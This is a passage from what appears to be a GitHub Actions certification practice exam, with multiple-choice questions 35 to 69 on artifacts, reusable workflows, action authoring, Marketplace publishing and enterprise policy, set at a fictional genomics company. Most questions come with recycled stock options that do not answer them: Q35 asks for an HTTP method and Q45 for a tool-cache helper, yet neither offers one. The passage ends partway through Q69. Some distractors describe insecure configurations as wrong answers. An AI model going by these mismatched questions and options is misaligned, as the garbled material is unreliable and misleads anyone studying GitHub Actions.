- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)

### 35. A compliance cleanup script needs to purge leaked diagnostic logs from completed workflow run `55401928` immediately via the GitHub REST API without deleting the workflow run record itself. Complete the REST call: `____ /repos/vireobio/assay-kit/actions/runs/55401928/logs`.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 36. In `vireobio/assay-kit`, `actions/upload-artifact@v4` uploads `./reports/coverage.xml` alongside hidden `.env.test` files in `./reports/`? By default, how does `actions/upload-artifact@v4` treat hidden dotfiles (`.env*`, `.git*`), and which input controls that behavior?

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 37. VireoBio Genomics migrates legacy workflows from retired `actions/upload-artifact@v3` / `download-artifact@v3` to `@v4` across 30 matrix repositories. Which two `v4` behavioral changes and capabilities must engineers account for? Select two.

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Give each matrix job a unique `upload-artifact@v4` name (`artifact-${{ matrix.os }}`) and merge them downstream with `download-artifact@v4` (`pattern: artifact-*`, `merge-multiple: true`)
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 38. Caller `vireobio/assay-kit` invokes `jobs.verify.uses: vireobio/ci-core/.github/workflows/parent.yml@v2`, which calls `child-a.yml`, which calls `child-b.yml`, which calls `child-c.yml`, and then `child-c.yml` tries to call a 5th nested reusable workflow `grandchild-d.yml`. What happens?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 39. Inside reusable workflow `vireobio/ci-core/.github/workflows/docker-scan.yml`, a job declares `environment: security-gate` where secret `SNYK_TOKEN` is stored inside `vireobio/ci-core` (`NOT inside caller repo vireobio/aligner-cli`). When `vireobio/aligner-cli` calls `docker-scan.yml`, can `docker-scan.yml` read `vireobio/ci-core`'s own repository/environment secrets automatically?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)

### 40. VireoBio Genomics wants every newly created `Private` bioinformatics Python repository in the `vireobio` Enterprise Cloud organization to display a branded "VireoBio Assay CI" starter workflow in `Actions -> New workflow`. Complete the required repository + folder path: `vireobio/.github/____/assay-ci.yml` (`paired with assay-ci.properties.json`).

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **C.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 41. In `vireobio/.github/workflow-templates/`, you add custom icon `dna-helix.svg` so your starter template displays VireoBio's helix badge in the `Actions -> New workflow` gallery. How must `assay-ci.properties.json` reference `dna-helix.svg`?

- **A.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow

### 42. An active `on: schedule` workflow `ncbi-mirror.yml` in `vireobio/public-ref-genomes` (`a Public repo`) approaches 58 days without commits and sends an approaching-inactivity warning email to maintainers. How can a maintainer keep the scheduled workflow active without making empty Git commits?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 43. VireoBio Genomics' compliance team compares disabling `audit-export.yml` during a 14-day freeze versus deleting `.github/workflows/audit-export.yml` from `main`. Which two lifecycle behaviors distinguish disabling from deleting? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Disable noisy or paused workflows (`gh workflow disable` / UI) rather than deleting `.yml` files when historical run logs and quick re-enablement are required
- **E.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **F.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

---

## Domain 3 — Author and maintain actions (15–20% official weight · 19 questions)

### 44. VireoBio Genomics authors a cross-OS JavaScript action `vireobio/setup-samtools` using `@actions/tool-cache` and `@actions/exec`. Complete the two `action.yml` keys under `runs:` that configure the modern Node.js 20 runtime and bundled entrypoint: `using: '____'` and `main: 'dist/index.js'`.

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 45. Inside `vireobio/setup-samtools` (`node20`), your action downloads `samtools-1.21.tar.bz2`, extracts it, caches it into `$RUNNER_TOOL_CACHE` for subsequent steps, and prepends its `bin/` path. Which official `@actions/tool-cache` helper registers an extracted directory into `$RUNNER_TOOL_CACHE`?

- **A.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 46. VireoBio Genomics builds and ships `vireobio/vcf-schema-action` (`TypeScript / node20`) so downstream genomics pipelines run it in <1 second with zero `npm install` step. Order the authoring, `@actions/core` error handling, `@vercel/ncc` bundling, and tag/SHA release steps.

- **A.** Gitignore both `dist/` and `node_modules/` in the release commit → Set `runs.using: "node12"` in `action.yml` → Exit raw processes without `@actions/core` → Tell consumers to reference floating `@main` only
- **B.** Cut release `v1.0.0` before authoring `action.yml` → Require every caller repo to run `npm install` first → Embed static caller tokens inside `dist/index.js` → Delete the Git tag right after release
- **C.** Author `action.yml` (`using: "node20"`, `main: "dist/index.js"`) → Code with `@actions/core` & `core.setFailed()` → Bundle into `dist/index.js` (`@vercel/ncc`) & commit `dist/` → Tag `v1.0.0`, slide `v1`, and document the 40-char SHA
- **D.** Place `action.yml` inside `.github/workflows/` with no root metadata → Set `runs.using: "docker"` for a macOS/Windows helper action → Log secret inputs via `console.log` → Skip SemVer tags completely

### 47. VireoBio Genomics tests desktop genome viewers on `macos-15` (Apple Silicon) and `windows-2025` runners and wants a custom helper action to validate clinical license headers. Proposed solution: Implement the license-header validator as a `Dockerfile`-backed Docker container action (`runs.using: 'docker'`) so macOS and Windows jobs run it without Node.js. Does this meet the goal?

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **C.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 48. A developer authors `.github/actions/fastq-trim/action.yml` (`runs.using: 'composite'`) with two `run:` steps (`trim` and `summarize`) but omits `shell:` on step 2 assuming it inherits caller `defaults.run.shell: bash`. What happens when a workflow calls `./.github/actions/fastq-trim`?

- **A.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 49. VireoBio Genomics's architecture guild documents how `secrets` and inner `uses:` steps work inside Composite actions (`runs.using: 'composite'`) vs Reusable Workflows. Which two rules govern Composite actions? Select two.

- **A.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **F.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`

### 50. VireoBio Genomics turns on Immutable Actions publishing for `vireobio/vcf-schema-action` and cuts release `v1.1.0`. Under the hood, how does the runner verify and fetch `vireobio/vcf-schema-action@v1.1.0` compared to legacy Git-only tarball fetches?

- **A.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)

### 51. A Linux Docker container action (`runs: { using: 'docker', image: 'Dockerfile' }`) builds a heavy bioinformatics `Dockerfile` from scratch on every single consumer job (`taking 7 minutes per run`). Without switching away from a Docker container action, how do you cut action startup from 7 minutes to ~5 seconds?

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)

### 52. In `action.yml` for `vireobio/setup-samtools`, you declare `inputs: cache-hit-only: { description: 'Skip network fallback', required: false, default: 'false' }`. In your TypeScript code using `@actions/core`, complete the typed boolean reader `const strict = core.____('cache-hit-only');` (`validating YAML 1.2 true/True/TRUE vs false/False/FALSE`).

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 53. In `action.yml` for Docker container action `vireobio/cram-validator`, you want `inputs.reference-fasta` passed into the container via custom environment variable `REF_FASTA` (`in addition to automatic INPUT_REFERENCE-FASTA`) AND run a cleanup script after main execution. Which `runs:` keys on a `docker` action support this?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **D.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)

### 54. Before publishing `vireobio/vcf-schema-action` (`v1.0.0`) to GitHub Marketplace, your CI linter checks `action.yml` and repository structure. Which three requirements must pass? Select three.

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`
- **E.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **F.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 55. Inside `vireobio/vcf-schema-action` (`node20`), you generate a rich Markdown validation table for `$GITHUB_STEP_SUMMARY` programmatically without hand-concatenating raw file appends. Complete the `@actions/core` summary builder chain: `await core.____.addHeading('VCF Audit').addTable(rows).write();`.

- **A.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 56. A JavaScript action spawns external CLI tool `bcftools` to stream stdout into a variable while enforcing proper exit-code checking without shell command-injection (`avoiding child_process.exec("bcftools " + userInput)`). Which official GitHub Actions Toolkit package executes argument arrays safely without invoking `/bin/sh`?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 57. VireoBio Genomics wants external biotech customers (`outside VireoBio's GitHub Enterprise`) AND internal teams to consume open-source action `vireobio/fastq-qc-action`, while keeping proprietary algorithm action `vireobio/clinical-caller-action` strictly inside VireoBio's Enterprise organizations. Which dual distribution model fits?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 58. In `vireobio/assay-kit`, a private workflow must invoke private action `vireobio-partner/proprietary-action` hosted in an external GitHub Enterprise (`where native Access sharing cannot cross tenants`). Proposed solution: Run `actions/checkout@v4` for the caller repo, run a second `actions/checkout@v4` (`repository: vireobio-partner/proprietary-action, path: .ext/prop, token: ${{ secrets.PARTNER_APP_TOKEN }}`), and invoke `uses: ./.ext/prop`. Does this meet the goal?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 59. An engineer working from an Enterprise Managed User (`EMU`) account (`ayla_vireobio`) tries to create a `Public` repository on `github.com` to publish a community action to GitHub Marketplace and finds `Public` repository creation disabled. Why?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 60. A maintainer drafts a GitHub Release in `vireobio/fastq-qc-action` using tag `latest` (`non-SemVer`) and leaves two-factor authentication (`2FA`) disabled on their account. Proposed solution: Check `Publish this Action to the GitHub Marketplace` with tag `latest` and no `2FA` to list the action immediately. Does this meet the goal?

- **A.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 61. You discover a critical security bug in `vireobio/fastq-qc-action` `v1.2.1` and ship patch fix `v1.2.2`. Which Git commands update floating major tag `v1` to `v1.2.2` so `@v1` consumers receive the security patch automatically?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)

### 62. VireoBio Genomics configures `.github/dependabot.yml` with `package-ecosystem: "github-actions"`, `directory: "/"`, and `schedule: { interval: "weekly" }` in a repository with both `.github/workflows/*.yml` and `.github/actions/*/action.yml`. Which two behaviors apply? Select two.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **E.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **F.** Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)

---

## Domain 4 — Manage GitHub Actions for the enterprise (20–25% official weight · 24 questions)

### 63. VireoBio Genomics operates 6 organizations (`vireobio-clinical`, `vireobio-research`, etc.) under one GitHub Enterprise Cloud account and needs ONE mandatory container-provenance workflow enforced before PR merges on `main` across ALL 6 organizations without copying Rulesets per org. Which Enterprise-level feature enforces this?

- **A.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**

### 64. When configuring `Require workflows to pass before merging` inside a Repository Ruleset at VireoBio Genomics, why does GitHub restrict the source repository hosting that required workflow to `Internal` (`or Public`) visibility when shared across organizations, or `Private`/`Internal` with proper access?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 65. A required workflow enforced by an Organization Ruleset listens to `on: pull_request`. If a developer opens a PR modifying ONLY `docs/guide.md`, and someone added `paths-ignore: ['docs/**']` inside that required workflow, what happens to the PR's mergeability?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 66. VireoBio Genomics creates `Internal` repository `vireobio-platform/bio-actions` in org `vireobio-platform`. When `vireobio-clinical/caller-svc` (`a different org in the same Enterprise`) runs `uses: vireobio-platform/bio-actions/qc@<sha>`, it fails until `Access` is widened beyond the single organization. Which exact `Access` radio option in `vireobio-platform/bio-actions` fixes cross-org calls?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 67. Platform admins at VireoBio Genomics audit cross-repository sharing rules for `Private` and `Internal` repositories hosting custom actions and `workflow_call` workflows. Which two security boundaries are enforced automatically by GitHub? Select two.

- **A.** Store shared actions/reusable workflows in `Internal`/`Private` repos with `Actions -> General -> Access` enabled for the enterprise and enforce `Allow select actions` + full-SHA pinning
- **B.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 68. An Organization Owner wants repository admins in `vireobio-clinical` to be unable to switch their repo's default `GITHUB_TOKEN` workflow permissions back from `Read repository contents and packages permissions` to permissive `Read and write permissions`. How is that locked?

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 69. In `vireobio-clinical`, `Allowed actions and reusable workflows` is set to `Allow select actions` with pattern `hashicorp/vault-action@v3.*` AND `Require actions to be pinned to a full-length commit SHA` UNCHECKED. Does `uses: hashicorp/vault-action@v2.7.0` or `uses: hashicorp/vault-action@main` run?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
